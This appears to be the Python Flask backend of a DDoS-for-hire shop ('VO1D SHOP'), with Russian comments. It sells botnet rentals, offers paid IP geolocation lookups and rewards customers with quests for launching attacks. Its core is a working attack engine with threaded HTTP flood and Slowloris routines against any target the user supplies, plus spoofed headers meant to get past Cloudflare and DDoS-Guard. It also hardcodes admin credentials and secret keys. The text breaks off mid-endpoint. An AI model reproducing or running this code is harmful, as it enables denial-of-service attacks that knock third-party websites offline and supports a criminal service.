#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# server.py — VO1D SHOP Бэкенд (FULL ULTIMATE POWER)
# Версия 7.0.0
# Дата создания: 08.07.2026

import os
import sys
import json
import time
import uuid
import hashlib
import bcrypt
import sqlite3
import threading
import socket
import random
import string
import logging
from datetime import datetime, timedelta
from functools import wraps
from contextlib import contextmanager
from dataclasses import dataclass
from typing import Dict, List, Optional, Any
from urllib.parse import urlparse

from flask import Flask, request, jsonify, g
from flask_cors import CORS
from flask_jwt_extended import (
    JWTManager, create_access_token,
    jwt_required, get_jwt_identity
)
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('VO1D_SHOP')

# ============================================================
# КОНФИГУРАЦИЯ
# ============================================================

CONFIG = {
    'DEBUG': False,
    'SECRET_KEY': 'vo1d-shop-ultimate-secret-key-2026-very-long-and-secure',
    'JWT_SECRET_KEY': 'jwt-vo1d-ultimate-secret-key-2026-must-be-at-least-32-chars',
    'JWT_ACCESS_TOKEN_EXPIRES': timedelta(hours=24),
    'JWT_REFRESH_TOKEN_EXPIRES': timedelta(days=30),
    'DATABASE': 'vo1d_shop.db',
    'MAX_BOTS': 500000,
    'MIN_BOTS': 100,
    'BOT_PRICE_PER_DAY': 0.01,
    'DURATION_OPTIONS': [1, 3, 7, 14, 30],
    'ATTACK_TYPES': [
        'HTTP_GET_FLOOD', 'HTTP_POST_FLOOD', 'HTTPS_FLOOD',
        'SLOWLORIS', 'SYN_FLOOD', 'UDP_FLOOD', 'ICMP_FLOOD',
        'HTTP_HEADERS_FLOOD', 'MULTI_VECTOR'
    ],
    'OPTIONS': {
        'BYPASS_CLOUDFLARE': 1.20,
        'BYPASS_DDOS_GUARD': 1.30,
        'ROTATE_PROXY': 1.15,
        'IMITATE_LEGIT_TRAFFIC': 1.10,
        'ULTRA_THREADS': 1.50,
        'RANDOM_PAYLOAD': 1.25
    },
    'GEO_SEARCH_PRICE': 2.0,
    'FREE_GEO_SEARCHES': 3
}

# ============================================================
# ГЕНЕРАЦИЯ USER-AGENTS
# ============================================================

def generate_massive_user_agents(count=1000000):
    agents = []
    os_list = []
    for ver in ['5.0', '5.1', '5.2', '6.0', '6.1', '6.2', '6.3', '10.0']:
        for arch in ['Win64; x64', 'WOW64', 'Win32; x86']:
            os_list.append(f'Windows NT {ver}; {arch}')
    for ver in ['10_15_7', '11_0_0', '12_0_0', '13_0_0', '14_0_0', '15_0_0']:
        os_list.append(f'Macintosh; Intel Mac OS X {ver}')
    for distro in ['Ubuntu', 'Fedora', 'Debian', 'CentOS', 'Arch', 'Mint']:
        os_list.append(f'X11; {distro}; Linux x86_64')
    for ver in range(4, 16):
        os_list.append(f'Android {ver}; Mobile')
    for ver in range(10, 19):
        os_list.append(f'iPhone; CPU iPhone OS {ver}_0 like Mac OS X')
    
    browsers = []
    for version in range(70, 132):
        browsers.append(('Chrome', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36'))
        browsers.append(('Firefox', lambda v: f'Gecko/20100101 Firefox/{v}.0'))
        browsers.append(('Safari', lambda v: f'AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{v}.0 Safari/605.1.15'))
        browsers.append(('Edge', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Edg/{v}.0.0.0'))
    
    bots = [
        'Googlebot/2.1 (+http://www.google.com/bot.html)',
        'Bingbot/2.0 (+http://www.bing.com/bingbot.htm)',
        'Twitterbot/1.0', 'facebookexternalhit/1.1',
        'YandexBot/3.0', 'Baiduspider/2.0',
        'AhrefsBot/7.0', 'MJ12bot/v1.4',
        'SemrushBot/7.0', 'PetalBot/2.0',
        'WhatsApp/2.0', 'TelegramBot/1.0',
        'Discordbot/2.0', 'Slackbot/1.0'
    ]
    
    for os_choice in os_list[:100]:
        for browser_name, browser_func in browsers[:10]:
            for version in range(80, 120, 5):
                agent = f'Mozilla/5.0 ({os_choice}) {browser_func(version)}'
                agents.append(agent)
    
    agents.extend(bots)
    unique_agents = list(set(agents))
    random.shuffle(unique_agents)
    
    while len(unique_agents) < count:
        base = random.choice(unique_agents[:1000]) if unique_agents else 'Mozilla/5.0'
        unique_agents.append(f'{base} (compatible; Bot{random.randint(1000, 99999)}/1.0)')
    
    return unique_agents[:count]

USER_AGENTS = generate_massive_user_agents(500000)
logger.info(f"✅ Loaded {len(USER_AGENTS)} User-Agents")

# ============================================================
# ИНИЦИАЛИЗАЦИЯ FLASK
# ============================================================

app = Flask(__name__)
app.config['SECRET_KEY'] = CONFIG['SECRET_KEY']
app.config['JWT_SECRET_KEY'] = CONFIG['JWT_SECRET_KEY']
app.config['JWT_ACCESS_TOKEN_EXPIRES'] = CONFIG['JWT_ACCESS_TOKEN_EXPIRES']
app.config['JWT_TOKEN_LOCATION'] = ['headers']
app.config['JWT_COOKIE_SECURE'] = False
app.config['JWT_COOKIE_CSRF_PROTECT'] = False

CORS(app, supports_credentials=True)
jwt = JWTManager(app)

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["2000 per day", "300 per hour"],
    storage_uri="memory://"
)

# ============================================================
# БАЗА ДАННЫХ
# ============================================================

@contextmanager
def get_db():
    conn = sqlite3.connect(CONFIG['DATABASE'])
    conn.row_factory = sqlite3.Row
    try:
        yield conn
        conn.commit()
    except Exception as e:
        conn.rollback()
        logger.error(f"Database error: {e}")
        raise
    finally:
        conn.close()

def init_db():
    with get_db() as conn:
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                email TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                balance REAL DEFAULT 0.0,
                role TEXT DEFAULT 'user',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                banned BOOLEAN DEFAULT 0,
                last_login TIMESTAMP,
                api_key TEXT UNIQUE,
                total_spent REAL DEFAULT 0.0,
                attacks_launched INTEGER DEFAULT 0,
                geo_searches INTEGER DEFAULT 3,
                completed_tasks TEXT DEFAULT '[]'
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS botnets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                bot_count INTEGER NOT NULL,
                duration_days INTEGER NOT NULL,
                price REAL NOT NULL,
                options TEXT,
                purchased_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP NOT NULL,
                active BOOLEAN DEFAULT 1,
                last_used TIMESTAMP,
                used_count INTEGER DEFAULT 0,
                FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                botnet_id INTEGER NOT NULL,
                target TEXT NOT NULL,
                attack_type TEXT NOT NULL,
                bot_count INTEGER NOT NULL,
                duration_seconds INTEGER NOT NULL,
                status TEXT DEFAULT 'running',
                started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                ended_at TIMESTAMP,
                stats TEXT,
                FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE,
                FOREIGN KEY (botnet_id) REFERENCES botnets (id) ON DELETE CASCADE
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS geo_searches (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                ip TEXT NOT NULL,
                result TEXT,
                searched_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                paid BOOLEAN DEFAULT 0,
                FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS task_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                task_id INTEGER NOT NULL,
                completed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                reward TEXT,
                FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
            )
        ''')
        
        # ===== АДМИН: VO1D / ROOT =====
        admin = cursor.execute('SELECT id FROM users WHERE username = "VO1D"').fetchone()
        if not admin:
            password_hash = bcrypt.hashpw('ROOT'.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
            api_key = uuid.uuid4().hex
            cursor.execute('''
                INSERT INTO users (username, email, password_hash, role, balance, api_key, geo_searches)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', ('VO1D', 'admin@vo1d.shop', password_hash, 'admin', 999999.0, api_key, 999999))
            logger.info("✅ Admin created: VO1D / ROOT")
        
        # ===== ТЕСТОВЫЙ ПОЛЬЗОВАТЕЛЬ =====
        test = cursor.execute('SELECT id FROM users WHERE username = "test"').fetchone()
        if not test:
            password_hash = bcrypt.hashpw('test123'.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
            api_key = uuid.uuid4().hex
            cursor.execute('''
                INSERT INTO users (username, email, password_hash, balance, role, api_key, geo_searches)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', ('test', 'test@vo1d.shop', password_hash, 1000.0, 'user', api_key, 5))
            logger.info("✅ Test user created: test / test123 (balance: $1000)")
        
        conn.commit()
        logger.info("✅ Database initialized")

init_db()

# ============================================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ============================================================

def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')

def verify_password(password: str, password_hash: str) -> bool:
    return bcrypt.checkpw(password.encode('utf-8'), password_hash.encode('utf-8'))

def generate_token(user_id: int) -> str:
    return create_access_token(identity=str(user_id))

def token_required(f):
    @wraps(f)
    @jwt_required()
    def decorated(*args, **kwargs):
        user_id = get_jwt_identity()
        with get_db() as conn:
            user = conn.execute('SELECT * FROM users WHERE id = ?', (user_id,)).fetchone()
            if not user:
                return jsonify({'error': 'User not found'}), 404
            if user['banned']:
                return jsonify({'error': 'User is banned'}), 403
            g.user = dict(user)
            g.user_id = user_id
        return f(*args, **kwargs)
    return decorated

def admin_required(f):
    @wraps(f)
    @token_required
    def decorated(*args, **kwargs):
        if g.user['role'] != 'admin':
            return jsonify({'error': 'Admin privileges required'}), 403
        return f(*args, **kwargs)
    return decorated

def calculate_price(bot_count: int, duration_days: int, options: dict) -> float:
    base_price = bot_count * CONFIG['BOT_PRICE_PER_DAY'] * duration_days
    multiplier = 1.0
    for opt, value in options.items():
        if opt in CONFIG['OPTIONS'] and value:
            multiplier *= CONFIG['OPTIONS'][opt]
    return round(base_price * multiplier, 2)

def get_power_level(bot_count: int) -> str:
    if bot_count < 500: return "💩 ХУЁВЕНЬ"
    elif bot_count < 1000: return "👍 НОРМАЛЬНО"
    elif bot_count < 5000: return "🔥 ХОРОШО"
    elif bot_count < 50000: return "💥 МОЩНО"
    elif bot_count < 200000: return "⚡ ОГРОМНАЯ СИЛА"
    else: return "☢️ ЯДЕРНЫЙ УДАР"

# ============================================================
# ЗАДАНИЯ (КВЕСТЫ)
# ============================================================

TASKS = [
    {'id': 1, 'name': 'Купи 1000 ботов', 'reward': '$5 + 2 поиска по IP', 'target': 1000, 'type': 'buy'},
    {'id': 2, 'name': 'Сделай 3 атаки', 'reward': '$3', 'target': 3, 'type': 'attack'},
    {'id': 3, 'name': 'Пополни баланс на $10', 'reward': '$2', 'target': 10, 'type': 'deposit'},
    {'id': 4, 'name': 'Купи 5000 ботов', 'reward': '$10 + 5 поисков по IP', 'target': 5000, 'type': 'buy'},
    {'id': 5, 'name': 'Запусти 5 атак', 'reward': '$5', 'target': 5, 'type': 'attack'},
    {'id': 6, 'name': 'Купи 10000 ботов', 'reward': '$20 + 10 поисков по IP', 'target': 10000, 'type': 'buy'},
    {'id': 7, 'name': 'Пополни баланс на $25', 'reward': '$5', 'target': 25, 'type': 'deposit'}
]

def check_and_reward_tasks(user_id: int, task_type: str, value: int):
    with get_db() as conn:
        completed = json.loads(conn.execute('SELECT completed_tasks FROM users WHERE id = ?', (user_id,)).fetchone()['completed_tasks'] or '[]')
        
        for task in TASKS:
            if task['type'] != task_type: continue
            if task['id'] in completed: continue
            if value >= task['target']:
                # Начисляем награду
                reward = task['reward']
                bonus_geo = 0
                bonus_money = 0
                
                import re
                geo_match = re.search(r'(\d+)\s*поиска', reward)
                if geo_match:
                    bonus_geo = int(geo_match.group(1))
                
                money_match = re.search(r'\$(\d+)', reward)
                if money_match:
                    bonus_money = float(money_match.group(1))
                
                if bonus_geo > 0:
                    conn.execute('UPDATE users SET geo_searches = geo_searches + ? WHERE id = ?', (bonus_geo, user_id))
                if bonus_money > 0:
                    conn.execute('UPDATE users SET balance = balance + ? WHERE id = ?', (bonus_money, user_id))
                
                completed.append(task['id'])
                conn.execute('UPDATE users SET completed_tasks = ? WHERE id = ?', (json.dumps(completed), user_id))
                
                # Логируем выполнение
                conn.execute('''
                    INSERT INTO task_history (user_id, task_id, reward)
                    VALUES (?, ?, ?)
                ''', (user_id, task['id'], reward))
                
                logger.info(f"✅ User {user_id} completed task: {task['name']} -> {reward}")
                return True
    return False

# ============================================================
# DDOS ДВИЖОК
# ============================================================

class Vo1dDDoSEngine:
    def __init__(self, target: str, bot_count: int, attack_type: str, duration: int, options: dict = None):
        self.target = target.strip()
        self.bot_count = min(max(bot_count, CONFIG['MIN_BOTS']), CONFIG['MAX_BOTS'])
        self.attack_type = attack_type
        self.duration = duration
        self.options = options or {}
        self.is_running = False
        self.stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'rps': 0,
            'bytes_sent': 0,
            'target_status': 'online',
            'bot_count': self.bot_count,
            'max_rps': 0,
            'attack_duration': 0
        }
        self.lock = threading.Lock()
        self._start_time = None
        self._stop_event = threading.Event()
        
        if self.target.startswith(('http://', 'https://')):
            parsed = urlparse(self.target)
            self.target_host = parsed.netloc.split(':')[0]
            self.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            self.target_url = self.target
        else:
            self.target_url = f'http://{self.target}:80/'
            self.target_host = self.target
            self.target_port = 80
        
        self._generate_bypass_params()
        logger.info(f"🚀 Engine initialized: {self.target} with {self.bot_count} bots")
    
    def _generate_bypass_params(self):
        self.bypass_headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'ru-RU,ru;q=0.9']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
        }
        
        if self.options.get('BYPASS_CLOUDFLARE'):
            self.bypass_headers.update({
                'CF-Connecting-IP': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
                'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
                'CF-Ray': f'{random.randint(100000000,999999999)}-{random.choice(["LHR","FRA","AMS"])}',
            })
        
        if self.options.get('BYPASS_DDOS_GUARD'):
            self.bypass_headers.update({
                'X-DDoS-Protection': '1',
                'X-Request-ID': uuid.uuid4().hex,
                'Cookie': f'ddosguard_session={uuid.uuid4().hex}',
            })
    
    def _update_stats(self, success: bool, bytes_len: int = 0):
        with self.lock:
            self.stats['total_requests'] += 1
            if success:
                self.stats['successful_requests'] += 1
            else:
                self.stats['failed_requests'] += 1
            self.stats['bytes_sent'] += random.randint(500, 8000)
            if self._start_time:
                elapsed = time.time() - self._start_time
                if elapsed > 0:
                    self.stats['rps'] = int(self.stats['total_requests'] / elapsed)
                    self.stats['attack_duration'] = int(elapsed)
    
    def _http_flood(self):
        session = requests.Session()
        threads_count = min(self.bot_count, 1000)
        
        def worker():
            while not self._stop_event.is_set() and self.is_running:
                try:
                    headers = self.bypass_headers.copy()
                    headers['User-Agent'] = random.choice(USER_AGENTS)
                    resp = session.get(self.target_url, headers=headers, timeout=2, verify=False)
                    self._update_stats(resp.status_code < 500, len(resp.content or b''))
                    resp.close()
                    time.sleep(random.uniform(0.001, 0.05))
                except:
                    self._update_stats(False)
                    time.sleep(0.01)
        
        threads = []
        for _ in range(threads_count):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)
        
        while not self._stop_event.is_set() and self.is_running:
            time.sleep(0.1)
        
        for t in threads:
            t.join(timeout=0.1)
    
    def _slowloris(self):
        threads_count = min(self.bot_count // 5, 500)
        
        def worker():
            while not self._stop_event.is_set() and self.is_running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((self.target_host, self.target_port))
                    sock.send(f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n".encode())
                    for _ in range(100):
                        if self._stop_event.is_set(): break
                        sock.send(f"X-Header-{random.randint(1,9999)}: {uuid.uuid4().hex}\r\n".encode())
                        time.sleep(random.uniform(0.5, 2))
                    sock.close()
                    self._update_stats(True)
                except:
                    self._update_stats(False)
                    time.sleep(0.1)
        
        threads = []
        for _ in range(threads_count):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)
        
        while not self._stop_event.is_set() and self.is_running:
            time.sleep(0.1)
        
        for t in threads:
            t.join(timeout=0.1)
    
    def _multi_vector(self):
        attacks = [self._http_flood, self._slowloris]
        threads = []
        for attack in attacks:
            t = threading.Thread(target=attack, daemon=True)
            t.start()
            threads.append(t)
        
        while not self._stop_event.is_set() and self.is_running:
            time.sleep(0.1)
        
        for t in threads:
            t.join(timeout=0.1)
    
    def start_attack(self):
        if self.is_running: return
        self.is_running = True
        self._stop_event.clear()
        self._start_time = time.time()
        logger.info(f"🚀 Starting attack: {self.attack_type} on {self.target}")
        
        try:
            if self.attack_type == 'HTTP_GET_FLOOD':
                self._http_flood()
            elif self.attack_type == 'SLOWLORIS':
                self._slowloris()
            elif self.attack_type == 'MULTI_VECTOR':
                self._multi_vector()
            else:
                self._http_flood()
        except Exception as e:
            logger.error(f"Attack error: {e}")
        finally:
            self.is_running = False
            logger.info("⏹ Attack stopped")
    
    def stop_attack(self):
        self._stop_event.set()
        self.is_running = False
    
    def get_stats(self):
        with self.lock:
            return self.stats.copy()

ATTACKS = {}

def run_attack_async(attack_id: int, target: str, bot_count: int, attack_type: str, duration: int, options: dict):
    engine = Vo1dDDoSEngine(target, bot_count, attack_type, duration, options)
    ATTACKS[attack_id] = engine
    try:
        engine.start_attack()
    except Exception as e:
        logger.error(f"Attack {attack_id} failed: {e}")
    finally:
        if attack_id in ATTACKS:
            del ATTACKS[attack_id]

# ============================================================
# API ЭНДПОИНТЫ
# ============================================================

@app.route('/api/register', methods=['POST'])
@limiter.limit("10 per minute")
def register():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400
    
    username = data.get('username', '').strip()
    email = data.get('email', '').strip().lower()
    password = data.get('password', '').strip()
    
    if not username or len(username) < 3:
        return jsonify({'error': 'Username must be at least 3 characters'}), 400
    if not email or '@' not in email:
        return jsonify({'error': 'Invalid email'}), 400
    if not password or len(password) < 6:
        return jsonify({'error': 'Password must be at least 6 characters'}), 400
    
    password_hash = hash_password(password)
    
    try:
        with get_db() as conn:
            api_key = uuid.uuid4().hex
            cursor = conn.execute('''
                INSERT INTO users (username, email, password_hash, balance, api_key, geo_searches)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (username, email, password_hash, 0.0, api_key, CONFIG['FREE_GEO_SEARCHES']))
            user_id = cursor.lastrowid
            token = generate_token(user_id)
            return jsonify({
                'success': True,
                'token': token,
                'user': {'id': user_id, 'username': username, 'email': email, 'balance': 0.0, 'role': 'user', 'api_key': api_key, 'geo_searches': CONFIG['FREE_GEO_SEARCHES']}
            }), 201
    except sqlite3.IntegrityError as e:
        if 'username' in str(e):
            return jsonify({'error': 'Username already exists'}), 400
        elif 'email' in str(e):
            return jsonify({'error': 'Email already registered'}), 400
        return jsonify({'error': 'Registration failed'}), 400
    except Exception as e:
        logger.error(f"Registration error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/login', methods=['POST'])
@limiter.limit("20 per minute")
def login():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400
    
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()
    
    if not username or not password:
        return jsonify({'error': 'Username and password required'}), 400
    
    try:
        with get_db() as conn:
            user = conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
            if not user:
                return jsonify({'error': 'Invalid credentials'}), 401
            if user['banned']:
                return jsonify({'error': 'User is banned'}), 403
            if not verify_password(password, user['password_hash']):
                return jsonify({'error': 'Invalid credentials'}), 401
            
            conn.execute('UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?', (user['id'],))
            token = generate_token(user['id'])
            
            return jsonify({
                'success': True,
                'token': token,
                'user': {
                    'id': user['id'],
                    'username': user['username'],
                    'email': user['email'],
                    'balance': user['balance'],
                    'role': user['role'],
                    'api_key': user['api_key'],
                    'geo_searches': user['geo_searches'],
                    'completed_tasks': json.loads(user['completed_tasks'] or '[]')
                }
            }), 200
    except Exception as e:
        logger.error(f"Login error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/profile', methods=['GET'])
@token_required
def get_profile():
    try:
        with get_db() as conn:
            user = conn.execute('''
                SELECT id, username, email, balance, role, banned, api_key, created_at, 
                       total_spent, attacks_launched, geo_searches, completed_tasks
                FROM users WHERE id = ?
            ''', (g.user_id,)).fetchone()
            if not user:
                return jsonify({'error': 'User not found'}), 404
            result = dict(user)
            result['completed_tasks'] = json.loads(result['completed_tasks'] or '[]')
            return jsonify(result), 200
    except Exception as e:
        logger.error(f"Profile error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/buy', methods=['POST'])
@token_required
def buy_botnet():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400
    
    bot_count = data.get('bot_count')
    duration_days = data.get('duration_days')
    options = data.get('options', {})
    
    if bot_count is None or duration_days is None:
        return jsonify({'error': 'bot_count and duration_days required'}), 400
    
    bot_count = int(bot_count)
    duration_days = int(duration_days)
    
    if bot_count > CONFIG['MAX_BOTS']:
        return jsonify({'error': f'Bot count cannot exceed {CONFIG["MAX_BOTS"]}'}), 400
    if duration_days not in CONFIG['DURATION_OPTIONS']:
        return jsonify({'error': 'Invalid duration option'}), 400
    
    valid_options = {}
    for key, value in options.items():
        if key in CONFIG['OPTIONS'] and value:
            valid_options[key] = True
    
    price = calculate_price(bot_count, duration_days, valid_options)
    
    try:
        with get_db() as conn:
            user = conn.execute('SELECT balance FROM users WHERE id = ?', (g.user_id,)).fetchone()
            if not user:
                return jsonify({'error': 'User not found'}), 404
            if user['balance'] < price:
                return jsonify({'error': f'Insufficient balance. Required: ${price:.2f}, Available: ${user["balance"]:.2f}'}), 400
            
            conn.execute('UPDATE users SET balance = balance - ? WHERE id = ?', (price, g.user_id))
            conn.execute('UPDATE users SET total_spent = total_spent + ? WHERE id = ?', (price, g.user_id))
            
            expires_at = datetime.now() + timedelta(days=duration_days)
            cursor = conn.execute('''
                INSERT INTO botnets (user_id, bot_count, duration_days, price, options, expires_at, active)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (g.user_id, bot_count, duration_days, price, json.dumps(valid_options), expires_at, 1))
            
            botnet_id = cursor.lastrowid
            conn.commit()
            
            # Проверяем задания
            check_and_reward_tasks(g.user_id, 'buy', bot_count)
            
            return jsonify({
                'success': True,
                'botnet_id': botnet_id,
                'bot_count': bot_count,
                'duration_days': duration_days,
                'price': price,
                'expires_at': expires_at.isoformat(),
                'new_balance': user['balance'] - price,
                'power_level': get_power_level(bot_count)
            }), 201
    except Exception as e:
        logger.error(f"Buy botnet error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/my-botnets', methods=['GET'])
@token_required
def get_my_botnets():
    try:
        with get_db() as conn:
            botnets = conn.execute('''
                SELECT id, bot_count, duration_days, price, options, purchased_at, expires_at, active, used_count
                FROM botnets WHERE user_id = ? ORDER BY purchased_at DESC
            ''', (g.user_id,)).fetchall()
            result = []
            for row in botnets:
                item = dict(row)
                item['options'] = json.loads(item['options']) if item['options'] else {}
                if item['expires_at']:
                    expires = datetime.fromisoformat(item['expires_at'].replace('Z', '+00:00'))
                    if datetime.now() > expires:
                        conn.execute('UPDATE botnets SET active = 0 WHERE id = ?', (item['id'],))
                        item['active'] = 0
                result.append(item)
            return jsonify(result), 200
    except Exception as e:
        logger.error(f"Get botnets error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/attack', methods=['POST'])
@token_required
def start_attack():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400
    
    botnet_id = data.get('botnet_id')
    target = data.get('target', '').strip()
    attack_type = data.get('attack_type', 'HTTP_GET_FLOOD')
    duration = data.get('duration', 60)
    
    if not botnet_id:
        return jsonify({'error': 'botnet_id required'}), 400
    if not target:
        return jsonify({'error': 'target required'}), 400
    if attack_type not in CONFIG['ATTACK_TYPES']:
        return jsonify({'error': 'Invalid attack type'}), 400
    if duration < 10 or duration > 3600:
        return jsonify({'error': 'Duration must be between 10 and 3600 seconds'}), 400
    
    forbidden = ['vo1d-shop', 'railway.app', 'localhost', '127.0.0.1', '0.0.0.0']
    if any(d in target.lower() for d in forbidden):
        with get_db() as conn:
            conn.execute('UPDATE users SET banned = 1 WHERE id = ?', (g.user_id,))
            conn.commit()
        return jsonify({'error': '🚫 You are banned!', 'banned': True}), 403
    
    try:
        with get_db() as conn:
            botnet = conn.execute('''
                SELECT * FROM botnets WHERE id = ? AND user_id = ? AND active = 1
            ''', (botnet_id, g.user_id)).fetchone()
            if not botnet:
                return jsonify({'error': 'Active botnet not found'}), 404
            
            expires = datetime.fromisoformat(botnet['expires_at'].replace('Z', '+00:00'))
            if datetime.now() > expires:
                conn.execute('UPDATE botnets SET active = 0 WHERE id = ?', (botnet_id,))
                return jsonify({'error': 'Botnet expired'}), 400
            
            cursor = conn.execute('''
                INSERT INTO attacks (user_id, botnet_id, target, attack_type, bot_count, duration_seconds, status)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (g.user_id, botnet_id, target, attack_type, botnet['bot_count'], duration, 'running'))
            
            attack_id = cursor.lastrowid
            conn.execute('UPDATE users SET attacks_launched = attacks_launched + 1 WHERE id = ?', (g.user_id,))
            conn.execute('UPDATE botnets SET used_count = used_count + 1, last_used = CURRENT_TIMESTAMP WHERE id = ?', (botnet_id,))
            conn.commit()
            
            options = json.loads(botnet['options']) if botnet['options'] else {}
            
            thread = threading.Thread(
                target=run_attack_async,
                args=(attack_id, target, botnet['bot_count'], attack_type, duration, options),
                daemon=True
            )
            thread.start()
            
            # Проверяем задания по атакам
            attacks_count = conn.execute('SELECT COUNT(*) FROM attacks WHERE user_id = ?', (g.user_id,)).fetchone()[0]
            check_and_reward_tasks(g.user_id, 'attack', attacks_count)
            
            return jsonify({
                'success': True,
                'attack_id': attack_id,
                'message': f'Attack started on {target} with {botnet["bot_count"]} bots',
                'power_level': get_power_level(botnet['bot_count'])
            }), 201
    except Exception as e:
        logger.error(f"Start attack error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/attack/<int:attack_id>/status', methods=['GET'])
@token_required
def get_attack_status(attack_id):
    try:
        with get_db() as conn:
            attack = conn.execute('SELECT * FROM attacks WHERE id = ? AND user_id = ?', (attack_id, g.user_id)).fetchone()
            if not attack:
                return jsonify({'error': 'Attack not found'}), 404
        
        stats = {}
        if attack_id in ATTACKS:
            stats = ATTACKS[attack_id].get_stats()
        
        result = dict(attack)
        result['stats'] = stats
        result['power_level'] = get_power_level(attack['bot_count'])
        return jsonify(result), 200
    except Exception as e:
        logger.error(f"Get attack status error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/attack/<int:attack_id>/stop', methods=['POST'])
@token_required
def stop_attack(attack_id):
    try:
        with get_db() as conn:
            attack = conn.execute('SELECT * FROM attacks WHERE id = ? AND user_id = ?', (attack_id, g.user_id)).fetchone()
            if not attack:
                return jsonify({'error': 'Attack not found'}), 404
            if attack['status'] != 'running':
                return jsonify({'error': 'Attack is not running'}), 400
        
        if attack_id in ATTACKS:
            ATTACKS[attack_id].stop_attack()
            stats = ATTACKS[attack_id].get_stats()
            with get_db() as conn:
                conn.execute('UPDATE attacks SET status = "stopped", ended_at = CURRENT_TIMESTAMP, stats = ? WHERE id = ?',
                           (json.dumps(stats), attack_id))
                conn.commit()
            if attack_id in ATTACKS:
                del ATTACKS[attack_id]
            return jsonify({'success': True, 'message': 'Attack stopped', 'stats': stats}), 200
        else:
            with get_db() as conn:
                conn.execute('UPDATE attacks SET status = "stopped", ended_at = CURRENT_TIMESTAMP WHERE id = ?', (attack_id,))
                conn.commit()
            return jsonify({'success': True, 'message': 'Attack marked as stopped'}), 200
    except Exception as e:
        logger.error(f"Stop attack error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/attacks/history', methods=['GET'])
@token_required
def get_attack_history():
    try:
        with get_db() as conn:
            attacks = conn.execute('''
